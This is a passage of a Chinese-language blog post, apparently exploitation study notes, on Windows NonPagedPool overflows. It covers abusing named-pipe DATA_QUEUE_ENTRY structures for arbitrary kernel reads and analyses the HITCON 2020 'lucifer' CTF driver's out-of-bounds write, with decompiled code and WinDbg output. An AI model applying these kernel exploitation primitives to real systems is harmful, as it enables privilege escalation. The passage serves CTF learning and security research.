</span></span><span style="display:flex;"><span>      v15 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">28</span>) <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">32</span>);
</span></span><span style="display:flex;"><span>    v26 <span style="color:#ff79c6">=</span> v15;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v14 <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x30</span> <span style="color:#ff79c6">&amp;&amp;</span> _interlockedbittestandreset((<span style="color:#ff79c6">volatile</span> <span style="color:#8be9fd">signed</span> <span style="color:#ff79c6">__int32</span> <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">40</span>), <span style="color:#bd93f9">0</span>) )
</span></span><span style="display:flex;"><span>      v16 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(a3 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">40</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>      v16 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v16 )
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">goto</span> LABEL_14;
</span></span><span style="display:flex;"><span>    v16 <span style="color:#ff79c6">=</span> ExAllocatePool2(<span style="color:#bd93f9">0x41</span>i64, v14, &#39;rFpN&#39;);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> ( v16 )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v15 <span style="color:#ff79c6">=</span> v26;
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_14</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">36</span>) <span style="color:#ff79c6">=</span> v15;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">=</span> v13;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">32</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">24</span>) <span style="color:#ff79c6">=</span> v12;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">*</span>(_DWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">40</span>) <span style="color:#ff79c6">=</span> Size;
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">if</span> ( a4 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v13 )
</span></span><span style="display:flex;"><span>          v22 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(<span style="color:#ff79c6">const</span> <span style="color:#8be9fd">void</span> <span style="color:#ff79c6">**</span>)(v13 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">112</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>          v22 <span style="color:#ff79c6">=</span> a8;
</span></span><span style="display:flex;"><span>        memmove((<span style="color:#8be9fd">void</span> <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">48</span>), v22, (<span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span>)Size);
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> ( v24 <span style="color:#ff79c6">&lt;</span> (<span style="color:#8be9fd">int</span>)Size <span style="color:#ff79c6">-</span> a9 <span style="color:#ff79c6">&amp;&amp;</span> v13 )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v17 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">259</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">*</span>(_QWORD <span style="color:#ff79c6">*</span>)(v16 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>          v17 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">else</span>
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        v17 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">259</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#ff79c6">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">LABEL_51</span>:
</span></span><span style="display:flex;"><span>    NpFreeClientSecurityContext(v12);
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">3221225626</span>i64;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><h3 id="nonpagedpool-overflow">NonPagedPool Overflow</h3>
<p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">Windows-Non-Paged-Pool-Overflow-Exploitation</a></p>
<p>有源码以及详细的利用手法。</p>
<p>溢出覆盖一字节，也分别给出两种利用手段的exp</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">Al20c</span>(size_t Size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)ExAllocatePoolWithTag(NonPagedPoolNx, Size, &#39;AAAA&#39;);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> Size <span style="color:#ff79c6">&amp;&amp;</span> buf; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>		buf[i] <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39; &#39;</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NTSTATUS <span style="color:#50fa7b">All0c</span>(size_t Size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>	<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span> buf <span style="color:#ff79c6">=</span> (<span style="color:#8be9fd">char</span><span style="color:#ff79c6">*</span>)ExAllocatePoolWithTag(NonPagedPoolNx, Size, &#39;AAAA&#39;);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">for</span> (<span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>; i <span style="color:#ff79c6">&lt;=</span> Size <span style="color:#ff79c6">&amp;&amp;</span> buf; i<span style="color:#ff79c6">++</span>)
</span></span><span style="display:flex;"><span>		buf[i] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">return</span> STATUS_SUCCESS;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>展示如何创建unbuffered pipe</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>__kernel_entry NTSYSCALLAPI NTSTATUS <span style="color:#50fa7b">NtFsControlFile</span>(
</span></span><span style="display:flex;"><span>  [in]            HANDLE           FileHandle,
</span></span><span style="display:flex;"><span>  [in, optional]  HANDLE           Event,
</span></span><span style="display:flex;"><span>  [in, optional]  PIO_APC_ROUTINE  ApcRoutine,
</span></span><span style="display:flex;"><span>  [in, optional]  PVOID            ApcContext,
</span></span><span style="display:flex;"><span>  [out]           PIO_STATUS_BLOCK IoStatusBlock,
</span></span><span style="display:flex;"><span>  [in]            ULONG            FsControlCode,
</span></span><span style="display:flex;"><span>  [in, optional]  PVOID            InputBuffer,
</span></span><span style="display:flex;"><span>  [in]            ULONG            InputBufferLength,
</span></span><span style="display:flex;"><span>  [out, optional] PVOID            OutputBuffer,
</span></span><span style="display:flex;"><span>  [in]            ULONG            OutputBufferLength
</span></span><span style="display:flex;"><span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">//create the pipe/file in FILE_FLAG_OVERLAPPED mode (blocking mode)
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>NtFsControlFile(pipe_handle, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>, <span style="color:#ff79c6">&amp;</span>isb, <span style="color:#bd93f9">0x119FF8</span>, buf, sz, <span style="color:#bd93f9">0</span>, <span style="color:#bd93f9">0</span>);
</span></span></code></pre></div><h4 id="溢出数据足够多">溢出数据足够多</h4>
<p>可以控制整个 DATA_QUEUE_ENTRY</p>
<p>IRP任意读</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DATA_QUEUE_ENTRY</span>:
</span></span><span style="display:flex;"><span> NextEntry<span style="color:#ff79c6">=</span>whatever;
</span></span><span style="display:flex;"><span> Irp<span style="color:#ff79c6">=</span>Forged IRP Address;
</span></span><span style="display:flex;"><span> SecurityContext<span style="color:#ff79c6">=</span>ideally <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span> EntryType<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>;  <span style="color:#6272a4">// unbuffered
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span> QuotaInEntry<span style="color:#ff79c6">=</span>ideally <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span> DataSize<span style="color:#ff79c6">=</span>arbitrary read size;
</span></span><span style="display:flex;"><span> x<span style="color:#ff79c6">=</span>whatever;
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span>IRP<span style="color:#ff79c6">-&gt;</span>SystemBuffer <span style="color:#ff79c6">=</span> arbitrary read address
</span></span></code></pre></div><p>修改DataSize越界读</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">DATA_QUEUE_ENTRY</span>:
</span></span><span style="display:flex;"><span> NextEntry<span style="color:#ff79c6">=</span>whatever;
</span></span><span style="display:flex;"><span> Irp<span style="color:#ff79c6">=</span>ideally <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span> SecurityContext<span style="color:#ff79c6">=</span>ideally <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span> EntryType<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span> QuotaInEntry<span style="color:#ff79c6">=</span>ideally <span style="color:#bd93f9">0</span>; <span style="color:#6272a4">//mostly irrelevent in case we use the peek operation
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span> DataSize<span style="color:#ff79c6">=</span>something bigger than the original size;
</span></span><span style="display:flex;"><span> x<span style="color:#ff79c6">=</span>whatever;
</span></span></code></pre></div><p>相关利用：<a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">HITCON 2020 lucifer</a></p>
<h4 id="溢出长度比较小">溢出长度比较小</h4>
<p>结构体第一个元素Queue，是一个双向链表</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>Flink;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_LIST_ENTRY</span> <span style="color:#ff79c6">*</span>Blink;
</span></span><span style="display:flex;"><span>} LIST_ENTRY, <span style="color:#ff79c6">*</span>PLIST_ENTRY, PRLIST_ENTRY;
</span></span></code></pre></div><p>这样是可以修改链表的指向，指向其余的DATA_QUEUE_ENTRY，但是windows存在安全机制，检查<code>entry-&gt;Flink-&gt;Blink!=entry</code></p>
<p>我们可以使用<code>PeekNamedPipe</code> 读取而不释放</p>
<h4 id="overflow-任意地址写">overflow-&gt;任意地址写</h4>
<p>1字节溢出</p>
<h3 id="hitcon-2020-lucifer">HITCON 2020 lucifer</h3>
<p><a href="https://github.com/scwuaptx/CTF/tree/master/2020-writeup/hitcon/lucifer">lucifer</a>：Windows 10 Pro 20H2，一个非常低的权限运行 <code>cmd.exe</code></p>
<p>OOB write，angleboy还带有相关PPT，看PPT</p>
<p>四个功能，经典菜单堆</p>
<p>首先是Create：在NonPagedPoolNx创建0x400大小的chunk</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222000u</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  DbgPrint(<span style="color:#f1fa8c">&#34;Create</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> sub_1400051DC();
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_1400051DC</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v0; <span style="color:#6272a4">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>  PVOID PoolWithTag; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  v0 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  PoolWithTag <span style="color:#ff79c6">=</span> Destination;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>Destination )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    PoolWithTag <span style="color:#ff79c6">=</span> ExAllocatePoolWithTag((POOL_TYPE)<span style="color:#bd93f9">512</span>, <span style="color:#bd93f9">0x400u</span>i64, <span style="color:#bd93f9">0x6963754Cu</span>); 
</span></span><span style="display:flex;"><span>    Destination <span style="color:#ff79c6">=</span> PoolWithTag;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>PoolWithTag )
</span></span><span style="display:flex;"><span>    v0 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC0000017</span>;
</span></span><span style="display:flex;"><span>  RtlZeroMemory(PoolWithTag, <span style="color:#bd93f9">0</span>i64, <span style="color:#bd93f9">1024</span>i64);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v0;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ADD: system buffer 是我们传递的参数，可以看出来是个赋值</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222004u</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  DbgPrint(<span style="color:#f1fa8c">&#34;ADD</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( SystemBuffer <span style="color:#ff79c6">&amp;&amp;</span> InputBufferLength <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x18</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>	v11 <span style="color:#ff79c6">=</span> SystemBuffer[<span style="color:#bd93f9">2</span>];
</span></span><span style="display:flex;"><span>	v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)SystemBuffer;          <span style="color:#6272a4">// SystemBuffer
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>	v14 <span style="color:#ff79c6">=</span> v11;
</span></span><span style="display:flex;"><span>	v8 <span style="color:#ff79c6">=</span> sub_140001028(<span style="color:#ff79c6">&amp;</span>v13);
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_140001028</span>(_QWORD <span style="color:#ff79c6">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">__int64</span> result; <span style="color:#6272a4">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>Destination <span style="color:#ff79c6">||</span> a1[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0xDADADDAA</span>i64 )
</span></span><span style="display:flex;"><span>    result <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0xC0000022</span>i64;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)Destination <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">*</span>a1) <span style="color:#ff79c6">=</span> a1[<span style="color:#bd93f9">2</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>GET：读取内容</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x222008u</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  DbgPrint(<span style="color:#f1fa8c">&#34;GET</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( SystemBuffer <span style="color:#ff79c6">&amp;&amp;</span> OutputBufferLength <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x18</span> <span style="color:#ff79c6">&amp;&amp;</span> InputBufferLength <span style="color:#ff79c6">&gt;=</span> <span style="color:#bd93f9">0x18</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>	v9 <span style="color:#ff79c6">=</span> SystemBuffer[<span style="color:#bd93f9">2</span>];
</span></span><span style="display:flex;"><span>	v13 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)SystemBuffer;
</span></span><span style="display:flex;"><span>	v14 <span style="color:#ff79c6">=</span> v9;
</span></span><span style="display:flex;"><span>	v8 <span style="color:#ff79c6">=</span> sub_14000107C(<span style="color:#ff79c6">&amp;</span>v13);
</span></span><span style="display:flex;"><span>	v10 <span style="color:#ff79c6">=</span> v14;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">*</span>(_OWORD <span style="color:#ff79c6">*</span>)SystemBuffer <span style="color:#ff79c6">=</span> v13;
</span></span><span style="display:flex;"><span>	SystemBuffer[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> v10;
</span></span><span style="display:flex;"><span>	a2<span style="color:#ff79c6">-&gt;</span>IoStatus.Information <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">24</span>i64;
</span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">goto</span> LABEL_16;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#ff79c6">__fastcall</span> <span style="color:#50fa7b">sub_14000107C</span>(_QWORD <span style="color:#ff79c6">*</span>a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#8be9fd">unsigned</span> <span style="color:#8be9fd">int</span> v1; <span style="color:#6272a4">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">!</span>Destination <span style="color:#ff79c6">||</span> a1[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3671776682</span>i64 )
</span></span><span style="display:flex;"><span>    v1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">1073741790</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( <span style="color:#ff79c6">*</span>a1 <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x80u</span>i64 )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    a1[<span style="color:#bd93f9">2</span>] <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">*</span>((_QWORD <span style="color:#ff79c6">*</span>)Destination <span style="color:#ff79c6">+</span> <span style="color:#ff79c6">*</span>a1);
</span></span><span style="display:flex;"><span>    a1[<span style="color:#bd93f9">1</span>] <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">3735928559</span>i64;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> v1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Release，free掉chunk</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">case</span> <span style="color:#bd93f9">0x22200Cu</span><span style="color:#ff79c6">:</span>
</span></span><span style="display:flex;"><span>  DbgPrint(<span style="color:#f1fa8c">&#34;Release</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>);
</span></span><span style="display:flex;"><span>  v8 <span style="color:#ff79c6">=</span> sub_1400010E0();
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">__int64</span> <span style="color:#50fa7b">sub_1400010E0</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> ( Destination )
</span></span><span style="display:flex;"><span>    ExFreePoolWithTag(Destination, <span style="color:#bd93f9">0x6963754Cu</span>);
</span></span><span style="display:flex;"><span>  Destination <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">return</span> <span style="color:#bd93f9">0</span>i64;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>漏洞点：ADD，有一个越界写。</p>
<p>WritePipe在内核态调用了</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>ExAllocatePoolWithTag(NonpagedPoolNx, <span style="color:#ff79c6">sizeof</span>(payload)<span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x30</span>, tag)
</span></span></code></pre></div><p>每次写pipe，内核态会添加一个<code>DATA_QUEUE_ENTRY</code>。</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#ff79c6">typedef</span> <span style="color:#ff79c6">struct</span> <span style="color:#50fa7b">_DATA_QUEUE_ENTRY</span>{
</span></span><span style="display:flex;"><span>    LIST_ENTRY Queue;        <span style="color:#6272a4">// 双向链表
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    _IRP<span style="color:#ff79c6">*</span> Irp;
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">__int64</span> SecurityContext;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> EntryType;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> QuotaInEntry;
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> DataSize;           <span style="color:#6272a4">// 不包含元数据
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd">int</span> x;
</span></span><span style="display:flex;"><span>} DATA_QUEUE_ENTRY,<span style="color:#ff79c6">*</span>PDATA_QUEUE_ENTRY;
</span></span></code></pre></div><p>存在一点Debug信息，我们先查看获得对象的大小：0x440, 同时 <code>!pool</code>命令显示 pool header地址</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; lm m Luc*</span>
</span></span><span style="display:flex;"><span>Browse full module list
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">start</span>             end                 module name
</span></span><span style="display:flex;"><span>fffff800`40b70000 fffff800`40b78000   Lucifer    (deferred)             
</span></span><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; ba e1 fffff800`40b70000+0x5200</span>
</span></span><span style="display:flex;"><span>0: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; g</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>1: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; p</span>
</span></span><span style="display:flex;"><span>Lucifer+0x5206:
</span></span><span style="display:flex;"><span>fffff800`40b75206 48890513deffff  mov     qword ptr [Lucifer+0x3020 (fffff800`40b73020)],rax
</span></span><span style="display:flex;"><span>1: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; r rax</span>
</span></span><span style="display:flex;"><span>rax=ffff9a882f51c460
</span></span><span style="display:flex;"><span>1: <span style="color:#8be9fd;font-style:italic">kd</span><span style="color:#6272a4">&gt; !pool ffff9a882f51c460</span>
</span></span><span style="display:flex;"><span>Pool page ffff9a882f51c460 region is Nonpaged pool
</span></span><span style="display:flex;"><span> ffff9a882f51c000 size:  440 previous size:    0  (Allocated)  RLin
</span></span><span style="display:flex;"><span>*ffff9a882f51c450 size:  440 previous size:    0  (Allocated) *Luci
</span></span><span style="display:flex;"><span>		Owning component : Unknown (update pooltag.txt)
</span></span><span style="display:flex;"><span> ffff9a882f51c8b0 size:  440 previous size:    0  (Allocated)  Viaa
</span></span><span style="display:flex;"><span> ffff9a882f51cd10 size:  220 previous size:    0  (Allocated)  AleP
</span></span><span style="display:flex;"><span> ffff9a882f51cf30 size:   b0 previous size:    0  (Free)       Y..=
</span></span></code></pre></div><p>往里面写0x400个内容，0x440 = 0x10 pool header + 0x400 chunk + 0x30 padding</p>
